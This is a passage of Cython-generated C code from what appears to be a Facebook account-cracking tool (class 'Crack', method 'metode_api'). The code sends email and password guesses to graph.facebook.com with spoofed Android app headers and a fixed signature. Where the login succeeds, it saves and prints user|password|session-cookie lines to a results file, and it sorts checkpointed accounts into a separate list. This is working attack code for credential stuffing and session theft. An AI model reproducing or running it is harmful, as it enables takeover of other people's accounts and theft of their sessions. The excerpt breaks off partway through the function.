        __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__64, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 281, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 281, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 281, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_sdk_version, __pyx_t_3) < 0) __PYX_ERR(0, 281, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_email, __pyx_v_user) < 0) __PYX_ERR(0, 281, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_locale, __pyx_n_s_en_US) < 0) __PYX_ERR(0, 281, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_password, __pyx_v_pw) < 0) __PYX_ERR(0, 281, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_sdk, __pyx_n_s_android) < 0) __PYX_ERR(0, 281, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_generate_session_cookies, __pyx_kp_s_1) < 0) __PYX_ERR(0, 281, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_sig, __pyx_kp_s_4f648f21fb58fcd2aa1c65f35f441ef5) < 0) __PYX_ERR(0, 281, __pyx_L3_error)
        __Pyx_XDECREF_SET(__pyx_v_params, ((PyObject*)__pyx_t_6));
        __pyx_t_6 = 0;

        
        __pyx_t_6 = __Pyx_PyDict_NewPresized(8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_Host, __pyx_kp_s_graph_facebook_com) < 0) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_randint); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__65, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (PyDict_SetItem(__pyx_t_6, __pyx_kp_s_x_fb_connection_bandwidth, __pyx_t_1) < 0) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_randint); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__66, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (PyDict_SetItem(__pyx_t_6, __pyx_kp_s_x_fb_sim_hni, __pyx_t_3) < 0) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_randint); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__66, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (PyDict_SetItem(__pyx_t_6, __pyx_kp_s_x_fb_net_hni, __pyx_t_1) < 0) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (PyDict_SetItem(__pyx_t_6, __pyx_kp_s_x_fb_connection_quality, __pyx_n_s_EXCELLENT) < 0) __PYX_ERR(0, 282, __pyx_L3_error)
        if (unlikely(!__pyx_v_ua)) { __Pyx_RaiseUnboundLocalError("ua"); __PYX_ERR(0, 282, __pyx_L3_error) }
        if (PyDict_SetItem(__pyx_t_6, __pyx_kp_s_user_agent, __pyx_v_ua) < 0) __PYX_ERR(0, 282, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_6, __pyx_kp_s_content_type, __pyx_kp_s_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 282, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_6, __pyx_kp_s_x_fb_http_engine, __pyx_n_s_Liger) < 0) __PYX_ERR(0, 282, __pyx_L3_error)
        __Pyx_XDECREF_SET(__pyx_v_headers, ((PyObject*)__pyx_t_6));
        __pyx_t_6 = 0;

        
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_post); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 283, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_1 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 283, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_params, __pyx_v_params) < 0) __PYX_ERR(0, 283, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 283, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_allow_redirects, Py_False) < 0) __PYX_ERR(0, 283, __pyx_L3_error)
        __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__67, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 283, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_post);
        __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_post, __pyx_t_3);
        __Pyx_GIVEREF(__pyx_t_3);
        __pyx_t_3 = 0;

        
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_post, __pyx_n_s_text); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 284, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_20 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_session_key, __pyx_t_3, Py_EQ)); if (unlikely(__pyx_t_20 < 0)) __PYX_ERR(0, 284, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_21 = (__pyx_t_20 != 0);
        if (__pyx_t_21) {
        } else {
          __pyx_t_19 = __pyx_t_21;
          goto __pyx_L22_bool_binop_done;
        }
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_post, __pyx_n_s_text); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 284, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_21 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_EAA, __pyx_t_3, Py_EQ)); if (unlikely(__pyx_t_21 < 0)) __PYX_ERR(0, 284, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_20 = (__pyx_t_21 != 0);
        __pyx_t_19 = __pyx_t_20;
        __pyx_L22_bool_binop_done:;
        if (__pyx_t_19) {

          
          __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ok); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 285, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_22 = __Pyx_PyObject_Append(__pyx_t_3, __pyx_v_user); if (unlikely(__pyx_t_22 == ((int)-1))) __PYX_ERR(0, 285, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          
          __pyx_t_3 = __pyx_pf_4fmbf_5Crack_10metode_api_genexpr(((PyObject*)__pyx_cur_scope)); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 286, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_1 = __Pyx_PyString_Join(__pyx_kp_s__68, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 286, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_v_cookie = ((PyObject*)__pyx_t_1);
          __pyx_t_1 = 0;

          
          __pyx_t_1 = PyTuple_New(9); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 287, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_8 = 0;
          __pyx_t_5 = 127;
          __Pyx_INCREF(__pyx_kp_u__69);
          __pyx_t_8 += 3;
          __Pyx_GIVEREF(__pyx_kp_u__69);
          PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u__69);
          __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_H); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 287, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 287, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
          __Pyx_GIVEREF(__pyx_t_6);
          PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_6);
          __pyx_t_6 = 0;
          __Pyx_INCREF(__pyx_kp_u__70);
          __pyx_t_8 += 6;
          __Pyx_GIVEREF(__pyx_kp_u__70);
          PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u__70);
          __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_user, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 287, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
          __Pyx_GIVEREF(__pyx_t_6);
          PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_6);
          __pyx_t_6 = 0;
          __Pyx_INCREF(__pyx_kp_u__71);
          __pyx_t_8 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__71);
          PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_kp_u__71);
          __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_pw, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 287, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
          __Pyx_GIVEREF(__pyx_t_6);
          PyTuple_SET_ITEM(__pyx_t_1, 5, __pyx_t_6);
          __pyx_t_6 = 0;
          __Pyx_INCREF(__pyx_kp_u__71);
          __pyx_t_8 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__71);
          PyTuple_SET_ITEM(__pyx_t_1, 6, __pyx_kp_u__71);
          __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_cookie, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 287, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
          __Pyx_GIVEREF(__pyx_t_6);
          PyTuple_SET_ITEM(__pyx_t_1, 7, __pyx_t_6);
          __pyx_t_6 = 0;
          __Pyx_INCREF(__pyx_kp_u__72);
          __pyx_t_8 += 16;
          __Pyx_GIVEREF(__pyx_kp_u__72);
          PyTuple_SET_ITEM(__pyx_t_1, 8, __pyx_kp_u__72);
          __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_1, 9, __pyx_t_8, __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 287, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 287, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_hari_ini); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 288, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 288, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_6 = __Pyx_PyUnicode_Concat(__pyx_kp_u_OK_3, __pyx_t_3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 288, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_t_3 = PyTuple_New(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 288, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_GIVEREF(__pyx_t_6);
          PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_6);
          __Pyx_INCREF(__pyx_n_s_a);
          __Pyx_GIVEREF(__pyx_n_s_a);
          PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_n_s_a);
          __pyx_t_6 = 0;
          __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_3, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 288, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 288, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_6 = PyTuple_New(7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 288, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_8 = 0;
          __pyx_t_5 = 127;
          __Pyx_INCREF(__pyx_kp_u__73);
          __pyx_t_8 += 8;
          __Pyx_GIVEREF(__pyx_kp_u__73);
          PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_kp_u__73);
          __pyx_t_17 = __Pyx_PyObject_FormatSimple(__pyx_v_user, __pyx_empty_unicode); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 288, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_17);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_17);
          __Pyx_GIVEREF(__pyx_t_17);
          PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_17);
          __pyx_t_17 = 0;
          __Pyx_INCREF(__pyx_kp_u__71);
          __pyx_t_8 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__71);
          PyTuple_SET_ITEM(__pyx_t_6, 2, __pyx_kp_u__71);
          __pyx_t_17 = __Pyx_PyObject_FormatSimple(__pyx_v_pw, __pyx_empty_unicode); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 288, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_17);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_17);
          __Pyx_GIVEREF(__pyx_t_17);
          PyTuple_SET_ITEM(__pyx_t_6, 3, __pyx_t_17);
          __pyx_t_17 = 0;
          __Pyx_INCREF(__pyx_kp_u__71);
          __pyx_t_8 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__71);
          PyTuple_SET_ITEM(__pyx_t_6, 4, __pyx_kp_u__71);
          __pyx_t_17 = __Pyx_PyObject_FormatSimple(__pyx_v_cookie, __pyx_empty_unicode); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 288, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_17);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_17);
          __Pyx_GIVEREF(__pyx_t_17);
          PyTuple_SET_ITEM(__pyx_t_6, 5, __pyx_t_17);
          __pyx_t_17 = 0;
          __Pyx_INCREF(__pyx_kp_u__39);
          __pyx_t_8 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__39);
          PyTuple_SET_ITEM(__pyx_t_6, 6, __pyx_kp_u__39);
          __pyx_t_17 = __Pyx_PyUnicode_Join(__pyx_t_6, 7, __pyx_t_8, __pyx_t_5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 288, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_17);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_6 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_3);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_3, function);
            }
          }
          __pyx_t_1 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_6, __pyx_t_17) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_17);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
          if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 288, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          goto __pyx_L10_break;

          
        }

        
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_post, __pyx_n_s_json); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 290, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_17 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
          __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_3);
          if (likely(__pyx_t_17)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_17);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
          }
        }
        __pyx_t_1 = (__pyx_t_17) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_17) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
        __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 290, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_PyObject_Dict_GetItem(__pyx_t_1, __pyx_n_s_error); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 290, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_t_3, __pyx_n_s_message); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 290, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_20 = (__Pyx_PySequence_ContainsTF(__pyx_kp_s_User_must_verify_their_account_o, __pyx_t_1, Py_EQ)); if (unlikely(__pyx_t_20 < 0)) __PYX_ERR(0, 290, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_21 = (__pyx_t_20 != 0);
        if (!__pyx_t_21) {
        } else {
          __pyx_t_19 = __pyx_t_21;
          goto __pyx_L24_bool_binop_done;
        }
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_post, __pyx_n_s_text); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 290, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_21 = (__Pyx_PySequence_ContainsTF(__pyx_kp_s_User_must_verify_their_account, __pyx_t_1, Py_EQ)); if (unlikely(__pyx_t_21 < 0)) __PYX_ERR(0, 290, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_20 = (__pyx_t_21 != 0);
        __pyx_t_19 = __pyx_t_20;
        __pyx_L24_bool_binop_done:;
        if (__pyx_t_19) {

          
          __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_cp); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 291, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_22 = __Pyx_PyObject_Append(__pyx_t_1, __pyx_v_user); if (unlikely(__pyx_t_22 == ((int)-1))) __PYX_ERR(0, 291, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          __pyx_t_1 = PyTuple_New(7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 292, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_8 = 0;
          __pyx_t_5 = 127;
          __Pyx_INCREF(__pyx_kp_u__69);
          __pyx_t_8 += 3;
          __Pyx_GIVEREF(__pyx_kp_u__69);
          PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u__69);
          __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_K); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 292, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_17 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 292, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_17);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_17);
          __Pyx_GIVEREF(__pyx_t_17);
          PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_17);
          __pyx_t_17 = 0;
          __Pyx_INCREF(__pyx_kp_u__70);
          __pyx_t_8 += 6;
          __Pyx_GIVEREF(__pyx_kp_u__70);
          PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u__70);
          __pyx_t_17 = __Pyx_PyObject_FormatSimple(__pyx_v_user, __pyx_empty_unicode); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 292, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_17);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_17);
          __Pyx_GIVEREF(__pyx_t_17);
          PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_17);
          __pyx_t_17 = 0;
          __Pyx_INCREF(__pyx_kp_u__71);
          __pyx_t_8 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__71);
          PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_kp_u__71);
          __pyx_t_17 = __Pyx_PyObject_FormatSimple(__pyx_v_pw, __pyx_empty_unicode); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 292, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_17);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_17);
          __Pyx_GIVEREF(__pyx_t_17);
          PyTuple_SET_ITEM(__pyx_t_1, 5, __pyx_t_17);
          __pyx_t_17 = 0;
          __Pyx_INCREF(__pyx_kp_u__74);
          __pyx_t_8 += 18;
          __Pyx_GIVEREF(__pyx_kp_u__74);
          PyTuple_SET_ITEM(__pyx_t_1, 6, __pyx_kp_u__74);
